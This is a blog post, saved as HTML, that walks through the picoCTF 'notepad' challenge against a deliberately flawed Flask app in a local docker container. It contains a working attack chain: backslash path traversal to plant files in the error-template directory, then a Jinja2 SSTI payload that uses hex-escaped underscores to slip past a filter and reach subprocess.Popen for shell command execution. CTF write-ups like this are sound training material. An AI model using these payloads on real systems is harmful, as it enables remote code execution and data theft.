<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=theme-color content="#494f5c"><meta name=msapplication-TileColor content="#494f5c"><meta itemprop=name content="picoCTF - notepad"><meta itemprop=description content="Premise We&rsquo;re given a service that will take abitrary input, and render it as an HTML page.
There are a few restrictions:
 Content cannot be longer than 512 characters Content cannot include _ or / characters  Lastly, from the Dockerfile we know that the flag is going to have an arbtirary name starting with flag-.
Examining the tarball This challenge comes with a tarball that contains the source code so we can do some white box analysis of how all of this works."><meta itemprop=datePublished content="2022-03-26T00:00:00+00:00"><meta itemprop=dateModified content="2022-03-26T00:00:00+00:00"><meta itemprop=wordCount content="934"><meta itemprop=keywords content="ctf,"><meta property="og:title" content="picoCTF - notepad"><meta property="og:description" content="Premise We&rsquo;re given a service that will take abitrary input, and render it as an HTML page.
There are a few restrictions:
 Content cannot be longer than 512 characters Content cannot include _ or / characters  Lastly, from the Dockerfile we know that the flag is going to have an arbtirary name starting with flag-.
Examining the tarball This challenge comes with a tarball that contains the source code so we can do some white box analysis of how all of this works."><meta property="og:type" content="article"><meta property="og:url" content="https://www.maclaren.dev/posts/2022-03/pico_notepad/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-03-26T00:00:00+00:00"><meta property="article:modified_time" content="2022-03-26T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="picoCTF - notepad"><meta name=twitter:description content="Premise We&rsquo;re given a service that will take abitrary input, and render it as an HTML page.
There are a few restrictions:
 Content cannot be longer than 512 characters Content cannot include _ or / characters  Lastly, from the Dockerfile we know that the flag is going to have an arbtirary name starting with flag-.
Examining the tarball This challenge comes with a tarball that contains the source code so we can do some white box analysis of how all of this works."><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><title>picoCTF - notepad</title><link rel=stylesheet href=https://www.maclaren.dev/css/style.min.037b6ee8f8c1baab6a3d0a9da11c3ff18a7552471f16c59fd98538d5ce99208b.css integrity="sha256-A3tu6PjBuqtqPQqdoRw/8Yp1UkcfFsWf2YU41c6ZIIs=" crossorigin=anonymous></head><body id=page><header id=site-header class="animated slideInUp"><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://www.maclaren.dev>Logan MacLaren</a></div><nav class="site-nav hide-in-mobile"><a href=https://www.maclaren.dev/posts/>Blog</a></nav></div><div class="hdr-right hdr-icons"><button id=toc-btn class="hdr-btn desktop-only-ib" title="Table of Contents"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-list"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3" y2="6"/><line x1="3" y1="12" x2="3" y2="12"/><line x1="3" y1="18" x2="3" y2="18"/></svg></button><span class="hdr-social hide-in-mobile"><a href=https://www.linkedin.com/in/loganmaclaren/ target=_blank rel="noopener me" title=Linkedin><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a><a href=https://github.com/maclarel target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://infosec.exchange/@gill3tt3 target=_blank rel="noopener me" title=Mastodon><svg xmlns="http://www.w3.org/2000/svg" class="feather feather-link" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://www.maclaren.dev/posts/>Blog</a></li></ul></div><main class="site-main section-inner animated fadeIn faster"><article class=thin><header class=post-header><div class=post-meta><span>Mar 26, 2022</span></div><h1>picoCTF - notepad</h1></header><div class=content><h1 id=premise>Premise<a href=#premise class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>We&rsquo;re given a service that will take abitrary input, and render it as an HTML page.</p><p>There are a few restrictions:</p><ul><li>Content cannot be longer than 512 characters</li><li>Content cannot include <code>_</code> or <code>/</code> characters</li></ul><p>Lastly, from the <code>Dockerfile</code> we know that the flag is going to have an arbtirary name <em>starting with</em> <code>flag-</code>.</p><h1 id=examining-the-tarball>Examining the tarball<a href=#examining-the-tarball class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>This challenge comes with a tarball that contains the source code so we can do some white box analysis of how all of this works.</p><p>At a high level, we can see that this is a Flask app (SSTI&mldr;?), and that we&rsquo;ve got a flag, and <code>static</code> and <code>templates/errors</code> directories.</p><p>From <code>app.py</code>, we can see how some of the application logic is enforced:</p><pre><code>def create():
    content = request.form.get(&quot;content&quot;, &quot;&quot;)
    if &quot;_&quot; in content or &quot;/&quot; in content:
        return redirect(url_for(&quot;index&quot;, error=&quot;bad_content&quot;))
    if len(content) &gt; 512:
        return redirect(url_for(&quot;index&quot;, error=&quot;long_content&quot;, len=len(content)))
    name = f&quot;static/{url_fix(content[:128])}-{token_urlsafe(8)}.html&quot;
    with open(name, &quot;w&quot;) as f:
        f.write(content)
    return redirect(name)
</code></pre><p>We&rsquo;re taking arbitrary input from the form in <code>index.html</code>, checking if it contains <code>_</code> or <code>/</code> (throw a <code>bad_content</code> error if so), then checking if it is > 512 charactersx in length (throw a <code>long_content</code> error if so.</p><p>From there, a name for the resultant file is generated using the <em>first 128 characters of the content</em> (!!), and then an arbitrary random suffix to avoid collisions.</p><p>Lastly, the file is written out, and the user is redirected to it.</p><h1 id=where-do-we-start>Where do we start?<a href=#where-do-we-start class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>First off, since we&rsquo;re generating a filename using only the first 128 characters, we can use that as padding, e.g. content of <code>12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678foobarbaz</code> will give us a file name of <code>12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-pGVBCkNvTLY.html</code>. For whatever we want to include so that it won&rsquo;t break the URL (e.g. if we wanted to use iframes to try to retrieve other content, relative pages, etc&mldr;). This may or may not be useful, but at face value cannot be used to retrieve content outside of the <code>static</code> dir.</p><p>If we try to do something simple like creating a new file outside of the <code>static</code> subdir, we&rsquo;ll just get a 500 error. For example, submitting content of <code>..\templates\foo.html</code> just results in <code>Internal Server Error</code> and no file creation. Similarly, attempts at LFI outside of the scope of the <code>static</code> dir through <code>iframes</code> will 404.</p><p>The attack surface as far as I can see it at this point is to try to do something like add a new error page, or overwrite the existing error pages (this should be possible due to how the file is being opened, <code>w</code>), with content that will allow us to gain further access.</p><h1 id=what-does-traffic-look-like>What does traffic look like?<a href=#what-does-traffic-look-like class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>If we proxy traffic through Burp (or anything similar), we&rsquo;re just doing a basic POST with a <code>content</code> parameter:</p><pre><code>POST /new HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://localhost:8000
Connection: close
Referer: http://localhost:8000/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1


content=foobar
</code></pre><p>Good news is this is easy enough for us to play with in Repeater & Intruder if we wanted to, but in retrospect it won&rsquo;t save much time.</p><h1 id=error-templates>Error templates<a href=#error-templates class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Another factor here is that looking at the error templates, these are included <em>based on a URL parameter</em>, so again, if we can create a new template, it&rsquo;s trivial for us to call it.</p><p>For example, running the docker container, if we write out an arbitrary <code>templates/errors/foo.html</code> file that contains whatever we want, we can just call it from <code>http://localhost:8000/?error=foo</code>.</p><p>But how do we do this&mldr;?</p><p>The first lead is that the application is using <code>url_fix</code>, which is going to change <code>\</code> characters to <code>/</code> for us, so that part of the content filtering is irrelevant. If we try a payload of <code>..\templates\errors\</code> we get some curious behaviour&mldr; the returned URL is <code>http://localhost:8000/templates/errors/-AkAtr82ZpXU.html</code>, and if we look at the local filesystem:</p><pre><code>root@bb0be7618f85:/app# ls templates/errors/
-AkAtr82ZpXU.html  bad_content.html  long_content.html
</code></pre><p>We have a way to create arbitrary files! We also know that we can manage the creation of the filename, and that content beyond the 128th character (but under 512) is entirely under our control.</p><p>Let&rsquo;s try a payload of:</p><pre><code>..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678

foobarbaz
</code></pre><p>Predictably, this will 404, but we get a returned URL of <code>http://localhost:8000/templates/errors/123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI.html</code>. Since we know this file <em>will</em> exist on the file system, we can also now try calling it as an error since we know the filename in whole by hitting <code>http://localhost:8000/?error=123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI</code>.</p><p>Sure enough, the full content is returned in the page content!</p><pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI
..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 foobarbaz
make a new note
...
</code></pre><h1 id=ssti>SSTI?<a href=#ssti class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>We&rsquo;ve got the ability to create arbitrary files, with content we <em>largely</em> control. Let&rsquo;s explore this further and see what vulnerabilities there are. To start, let&rsquo;s try a typical <code>{{ 7 * 7 }}</code> payload after our padding.</p><p>The rendered content?</p><pre><code>..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 49 
</code></pre><p>Note that 49! Woohoo! Alright, we know we can&rsquo;t include <code>_</code> characters in the content, but can we encode this in a different way? Perhaps a hex <code>\x5f</code>? Yes!</p><pre><code>{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
</code></pre><p>Sure enough, this also includes <code>&lt;class 'subprocess.Popen'></code> (position 273 in my case), so we&rsquo;re in business.</p><h1 id=time-for-rce>Time for RCE!<a href=#time-for-rce class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>With the hex form of <code>_</code> unfiltered, and access to <code>subprocess.Popen</code> we can use the following payload to proce out RCE:</p><pre><code>..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(273)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
</code></pre><p>Pass the resulting error page filename (minus URL) into <code>localhost:8000/?error=&lt;namehere></code>, and we get:</p><pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-gt_Z1Bro-iE
..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 app.py flag-bae52e25-3397-45de-8f53-f9e9a1d6a416.txt static templates 
</code></pre><p>And with one final tweak to run <code>cat flag*</code> instead of <code>ls</code>:</p><pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-WRn7y2p0oMg
..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 foobarbaz 
</code></pre><pre><code>root@bb0be7618f85:/app# cat flag-bae52e25-3397-45de-8f53-f9e9a1d6a416.txt 
foobarbaz
</code></pre><p>I&rsquo;ll leave you to get the flag for yourself on the live system ;)</p><p>Helpful reference:</p><ul><li><a href=https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f>Jinja2 SSTI filter bypasses</a></li></ul></div><hr class=post-end><footer class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://www.maclaren.dev/tags/ctf>ctf</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>934 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2022-03-26 00:00 +0000</p></footer></article><aside id=toc><div class=toc-title>Table of Contents</div><nav id=TableOfContents></nav></aside><div class="post-nav thin"><a class=next-post href=https://www.maclaren.dev/posts/2022-04/htb_paper/><span class=post-nav-label><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>&nbsp;Newer</span><br><span>Hack The Box - Paper</span></a>
<a class=prev-post href=https://www.maclaren.dev/posts/2021-11/home_lab_updates/><span class=post-nav-label>Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg></span><br><span>Home lab updates v2</span></a></div><div id=comments class=thin></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2024 <a href=https://www.maclaren.dev>Logan MacLaren</a> &#183; <a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a> &#183; <a rel=me href=https://infosec.exchange/@gill3tt3>Mastodon</a></p><p>Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> &#183; Theme <a href=https://github.com/Track3/hermit target=_blank rel=noopener>Hermit</a> &#183; <a href=https://www.maclaren.dev/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></p></footer><script src=https://www.maclaren.dev/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin=anonymous></script></body></html>